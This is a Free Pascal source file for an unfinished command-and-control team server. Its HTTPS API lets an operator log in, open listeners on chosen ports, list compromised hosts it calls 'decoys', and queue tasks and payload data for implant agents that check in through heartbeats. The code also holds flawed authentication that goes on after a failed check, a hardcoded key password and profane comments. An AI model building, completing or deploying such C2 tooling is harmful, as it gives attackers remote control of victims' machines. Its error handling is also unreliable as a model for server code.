program server;

{$mode objfpc}{$H+}

uses
  {$IFDEF UNIX}
  cthreads,
  {$ENDIF}
  Classes, SysUtils, CustApp, fphttpapp, httpdefs, custweb, httproute,
  custhttpapp, fpwebfile,base64,sslsockets,opensslsockets, fpjson, jsonparser,sql_worker,strutils;

  type


 { RESTful API application }

  TPasserver = class(TCustomApplication)
  protected
    procedure DoRun; override;
  public
    constructor Create(TheOwner: TComponent); override;
    destructor Destroy; override;

    procedure jsonResponse(res: TResponse; JSON: TJSONObject; httpCode: integer);
    procedure rerouteRoot(aRequest: TRequest; aResponse: TResponse);
   // procedure Tasks(req: Trequest; res: TResponse);
    procedure add_task(req: Trequest; res: TResponse);
    procedure auth(req: TRequest; res: Tresponse);
    procedure validateRequest(aRequest: TRequest);
    procedure listeners_create(req:TRequest; res: Tresponse);  // another thread , if operator has created new listner, specific end-points will be assigned, agent will only communicte to these of results or commands
    procedure decoys_list(req : Trequest; res: TResponse);



    procedure agent_heart_beat(req : Trequest; res: TResponse);

  end;
  var
    DB : TSQL;




   type
     TChild = class(TThread)   // this is for dev-02
      type

       TMyListeners = class(TCustomHTTPApplication);



     protected
     procedure execute(port:string);

     public
     constructor create(CreateSuspended : boolean);

      function Listeners: TMyListeners;
     end;

     var  // global vars
       _Listeners : TChild.TMyListeners;
       LAZ : TPasserver;
       s_child : Tchild;

       l_host : string; // use it with API GET Request



constructor TChild.create(CreateSuspended : boolean);
begin

       _Listeners := TMyListeners.Create(nil);

end;

procedure TChild.execute(port:string);
begin
       writeln('[+] establish new listener with port: ' + port);

       listeners.address:= l_host;

       listeners.Port := strtoint(port);
       listeners.run;
end;


function TChild.Listeners: TMyListeners;   // our listner function
var
  LAZ : TPasserver;

begin

{still in progress}

  with LAZ do begin

  HTTPRouter.RegisterRoute('/agent/heart_beat',@agent_heart_beat);

  // /agent/results  + /agents/tasks


  end;

 _Listeners.Threaded := true;
 _Listeners.Initialize;


Result := _Listeners;
end;





{ Parent Server}
  type

  TMyHttpApplication = class(TCustomHTTPApplication)

  protected

  end;

    var
     _Parent: TMyHttpApplication = nil;



{ TPasserver }



constructor TPasserver.Create(TheOwner: TComponent);
begin
  inherited Create(TheOwner);
  StopOnException:=True;

  DB := TSQL.Create; // create thread to handle SQL connections and procedures.
  DB.Create;
end;

destructor TPasserver.Destroy;
begin
  inherited Destroy;
end;


// thanks to @marcusfernstrm
procedure TPasserver.jsonResponse(res: TResponse; JSON: TJSONObject; httpCode: integer);
  begin
  res.Content := JSON.AsJSON;
  res.Code := httpCode;
  res.ContentType := 'application/json';
  res.ContentLength := length(res.Content);
  res.SendContent;
  end;


procedure TPasserver.rerouteRoot(aRequest: TRequest; aResponse: TResponse);
  begin
    aResponse.Code := 301;
    //aResponse.SetCustomHeader('Location', fileLocation + '/index.html');
    aResponse.SendContent;
  end;




procedure TPasserver.validateRequest(aRequest: TRequest);
 var
   headerValue, b64decoded, username, password,usr,pwd,token: string;
   magic:string;
   isvalid:boolean;
 begin

   // thanks to https://medium.com/@marcusfernstrm/freepascal-rest-apis-authenticating-requests-with-basic-auth-15aba39fd895

   headerValue := aRequest.Authorization;
    writeln(headervalue);
   if length(headerValue) = 0 then
     raise Exception.Create('This endpoint requires authentication');


   if ExtractWord(1, headerValue, [' ']) <> 'Basic' then
     raise Exception.Create('Only Basic Authentication is supported');

   b64decoded := DecodeStringBase64(ExtractWord(2, headerValue, [' ']));
   username := ExtractWord(1, b64decoded, [':']);
   password := ExtractWord(2, b64decoded, [':']);
   magic := extractword(2,headervalue,[' ']);


   with DB do begin
   check_creds(username,password,isvalid,token);
   end;

    if (token <> magic ) then
   raise Exception.Create('Invalid API credentials');


 end;


procedure TPasserver.auth(req: TRequest; res: Tresponse);
var
jObject : TJSONobject;
username,password,token : string;
okay:boolean;
httpCode: integer;
begin
 okay := false;
 jObject := TJSONObject.Create;
try


username := req.contentfields.values['user'];
password := req.ContentFields.Values['pwd'];



with DB do  begin
check_creds(username,password,okay,token);
if (okay = true ) then begin
jObject.Add('token',token);
httpcode := 200;
jsonresponse(res,Jobject,httpCode);
end;

end;
finally
 jobject.Free;
end;
end;

{AGENT CODE BLOCK }
procedure TPasserver.agent_heart_beat(req : Trequest; res: TResponse);
var
JSON: TJSONOBJECT;
httpcode:integer;
begin

JSON := Tjsonobject.Create;
Json.Add('status', 'i am a live'+l_host);
httpCode := 200;

jsonresponse(res,Json,httpcode);

end;
{END }



procedure TPasserver.listeners_create(req:TRequest; res: Tresponse);
var
JSON : TJSONOBJECT;
l_port: string;
httpcode : integer;

begin
JSON := TJSONObject.Create;

try
try
validateRequest(req); // I HAVE FIXED THIS

except on E: Exception do
begin
    Json.Add('success', False);
    Json.Add('reason', E.message);
    httpCode := 401;
    jsonresponse(res,Json,httpcode);
end;
end;

 l_port := req.QueryFields.Values['l_port'];
 l_host := req.QueryFields.Values['l_host'];


 // send post request with param l_port = value and pass it into thread execution

with s_child do begin

 s_child := Tchild.create(true);
 s_child.execute(l_port);

end;
JSON.Add('port',l_port);
JSON.Add('HOST',l_host);
jsonresponse(res,Json,httpcode);

finally
json.Free;
end;

end;

procedure TPasserver.decoys_list(req: Trequest; res: TResponse);
var
JSON : TJSONOBJECT;
JArray : TjsonArray;
UUID_list : Tstrings;
httpcode:integer;
i : integer;
begin

{there be must be auth protection }
JSON := TJSONObject.Create;   // going to create json object

try
try
validateRequest(req);


except on E: Exception do
begin
    Json.Add('success', False);
  Json.Add('reason', E.message);
    httpCode := 401;
   jsonresponse(res,Json,httpcode); // fuck you bitch, idiot

end;
end;

  // reflect the status if in case auth is failed,
JArray := TjsonArray.Create;  // create json array to handle the list of decoys
Json.Add('decoys',jarray);
httpcode := 200;
// this will render the results under the decoys JSON root

with DB do  begin
UUID_LIST := all_decoys;   // will take the list as string , i love you
end;

for i := 0 to UUID_list.Count -1 do begin    // read all inside the list
JArray.Add(UUID_LIST[i]);   // add it into json array.
end;

jsonresponse(res,JSON,httpcode);

finally
 json.Free;
end;

end;



procedure TPasserver.add_task(req: Trequest; res: TResponse);
 var
  jObject : TJSONobject;
  UUID,Res_str,task_name,task_data,validation:string;
  httpcode:integer;
begin
jObject := TJSONObject.Create;
try
try
validateRequest(req);
except on E: Exception do
begin
    jObject.Add('success', False);
    jObject.Add('reason', E.message);
    httpCode := 401;
end;
end;
jsonresponse(res,Jobject,httpcode);


UUID := req.contentfields.values['UUID'];
task_name := req.contentfields.values['task_name'];
task_data := req.contentfields.Values['task_data'];

with DB do  begin

isdecoy(UUID,validation);

if (validation = UUID) then begin

add_task(UUID,task_name,task_data);

end;

end;

jObject.Add('UUID',UUID);
jObject.Add('task_name',task_name);
Jobject.Add('task_data',task_data);

jsonresponse(res,Jobject,httpcode);
finally
jobject.Free;
end;

end;


function Team_server: TMyHttpApplication;

begin
    if not Assigned(_Parent) then
    begin




   _Parent := TMyHttpApplication.Create(nil);
   _Parent.Port := 8000;

   _Parent.UseSSL:=true;
   _Parent.CertificateData.HostName := 'zux0x3a-virtual-machine';
   _Parent.CertificateData.KeyPassword:='123456';
   _Parent.CertificateData.PrivateKey.FileName := getcurrentdir+'/key.pem';
   _Parent.CertificateData.Certificate.FileName := getcurrentdir+'/cert.pem';


  //if UseSSL then
  //RegisterFileLocation(fileLocation, 'public_html');
   with LAZ do begin
    try

  HTTPRouter.RegisterRoute('/listeners/create',@listeners_create);


  // agent will connect it and update their logs and online status
  //HTTPRouter.RegisterRoute('/tasks/', @tasks);

  // authentication
  HTTPRouter.RegisterRoute('/auth/',@auth);


 HTTPRouter.RegisterRoute('/decoys/list',@decoys_list);

  //HTTPRouter.RegisterRoute('/decoy/results',@decoy_data);

  // LAZ client will create listner profile
  //HTTPRouter.RegisterRoute('/listeners/add',@listeners);


  // LAZ client will connect and assign a task for decoy (Protected)
  HTTPRouter.RegisterRoute('/tasks/add/', @add_task);

  // update status after execution. it requires (UUID + task_id)
  //HTTPRouter.RegisterRoute('/tasks/update/',@task_update);

  // agent will use this end point to get content of assigned payload to execute
 // HTTPRouter.RegisterRoute('/tasks/view/',@tasks_view);

 // // final end-point to send results
 // HTTPRouter.RegisterRoute('/tasks/decoy/', @decoy);


  _Parent.HostName:='192.168.33.135';
  _Parent.UseSSL:=true;



 _Parent.Threaded := True;
 _Parent.Initialize;

except on E : Exception do begin
    writeln(E.message);
end;
end;
end;
    Result := _Parent;
  end;

  end;

procedure TPasserver.DoRun;
var
  ErrorMsg: String;
begin
 Team_server.Run;
end;

var
  Application: TPasserver;
begin
  Application:=TPasserver.Create(nil);
  Application.Title:='PAS Server';
  Application.Run;
  Application.Free;
end.

